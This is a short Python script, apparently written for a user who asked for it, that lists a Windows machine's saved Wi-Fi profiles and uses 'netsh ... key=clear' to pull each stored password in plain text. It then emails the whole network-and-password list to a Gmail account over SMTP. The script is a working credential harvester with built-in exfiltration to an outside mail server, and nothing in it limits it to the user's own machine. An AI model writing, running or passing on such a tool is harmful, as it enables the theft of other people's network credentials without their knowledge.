import subprocess
import smtplib
import os
import ssl
from email.message import EmailMessage
from dotenv import load_dotenv

load_dotenv()

# Retrieve credentials from Environment Variables
email_address = os.getenv("EMAIL")
# Use the 16-character App Password here
email_password = os.getenv("PASSWORD") 

def send_email(user, pwd, content):
    msg = EmailMessage()
    msg.set_content(content)
    msg["Subject"] = "Wi-Fi Profile Report"
    msg["From"] = user
    msg["To"] = user # Sending it to yourself

    context = ssl.create_default_context()

    # Using port 465 for SMTP_SSL is generally more stable
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(user, pwd)
        server.send_message(msg)

# 1. Get the list of Wi-Fi profiles
try:
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split("\n")
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

    listi = []

    # 2. Get the password for each profile
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split("\n")
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        
        # Using the i : results[0] format you requested
        try:
            listi.append(f"{i} : {results[0]}")
        except IndexError:
            listi.append(f"{i} : [No Password Found]")

    # 3. Combine list into a single string
    res = "\n".join(listi)

    # 4. Send the report
    if email_address and email_password:
        send_email(email_address, email_password, res)
        print("[+] Report sent successfully!")
    else:
        print("[-] Error: Email or Password environment variables not set.")

except subprocess.CalledProcessError:
    print("[-] Error: Could not run netsh command.")
except Exception as e:
    print(f"[-] An error occurred: {e}")